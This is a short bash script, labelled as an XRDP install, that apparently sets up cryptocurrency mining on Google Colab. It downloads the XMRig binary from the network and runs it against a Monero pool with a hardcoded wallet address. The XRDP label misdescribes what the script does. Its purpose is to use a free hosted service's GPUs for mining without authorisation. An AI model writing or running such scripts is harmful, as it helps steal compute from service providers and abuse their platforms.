#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --cuda -o us-west.minexmr.com:443 -u 84fEtd6AZ6eRe4jnjSHfAFKhPkaegfBTwKhGHquqZdoqgmBd3WDJNb7cMZYn1Sj5x62gmwoBJY1GRYJjEh8LkLHRKUzHrqE -k --tls --rig-id GC-US
